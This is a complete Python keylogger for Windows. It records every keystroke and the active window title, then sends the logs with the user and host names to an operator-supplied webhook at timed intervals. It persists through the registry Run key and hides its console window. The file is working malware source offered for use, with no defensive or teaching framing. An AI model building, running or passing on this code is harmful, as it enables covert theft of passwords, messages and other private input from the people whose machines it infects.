import os
import sys
import time
import json
import threading
import requests
import winreg
import ctypes
from datetime import datetime
from pynput import keyboard

WEBHOOK_URL = "YOUR_WEBHOOK_HERE" # Your webhook here

class Keylogger:
    def __init__(self, webhook_url: str, log_interval: int = 60):
        self.webhook_url = webhook_url
        self.log_interval = log_interval
        self.log_buffer = ""
        self.modifiers = set()
        self.active_window = ""
        
        self.username = os.getenv("USERNAME", "UNKNOWN")
        self.computer_name = os.getenv("COMPUTERNAME", "UNKNOWN")
        
        self.special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PGUP]",
            keyboard.Key.page_down: "[PGDN]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[RIGHT_SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[RIGHT_SHIFT]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT_GR]",
            keyboard.Key.cmd: "[WIN]",
            keyboard.Key.cmd_r: "[WIN_R]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
        }
        self.webhook(f"```\nKEYLOGGER ACTIVATED\nUser: {self.username}\nHost: {self.computer_name}\nTime: {datetime.now()}\n```")

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.report_timer = threading.Timer(self.log_interval, self.report)
        self.report_timer.daemon = True
        self.report_timer.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    def on_press(self, key):
        try:
            if key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt, keyboard.Key.cmd):
                self.modifiers.add(key)
                return
            
            if key in self.special_keys:
                self.log_buffer += self.special_keys[key]
                return
            
            char = key.char if hasattr(key, "char") else str(key)
            self.log_buffer += char
            
        except Exception as e:
            pass

    def on_release(self, key):
        if key in self.modifiers:
            self.modifiers.remove(key)

    def report(self):
        if not self.log_buffer:
            return
        
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        window_title = buff.value
        
        log_data = f"```\n[{window_title}]\n{self.log_buffer}\n```"
        self.webhook(log_data)
        
        self.log_buffer = ""
        self.report_timer = threading.Timer(self.log_interval, self.report)
        self.report_timer.daemon = True
        self.report_timer.start()

    def webhook(self, content: str):
        try:
            requests.post(self.webhook_url, json={"content": content})
        except Exception:
            pass

    def startup(self):
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
            app_name = os.path.basename(app_path)
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
                winreg.CloseKey(key)
            except Exception:
                pass
        else:
            app_path = sys.executable
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "keylogger", 0, winreg.REG_SZ, app_path)
                winreg.CloseKey(key)
            except Exception:
                pass

def hide():
    if getattr(sys, "frozen", False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":    
    hide()
    keylogger = Keylogger(WEBHOOK_URL)
    keylogger.startup()
    keylogger.start()
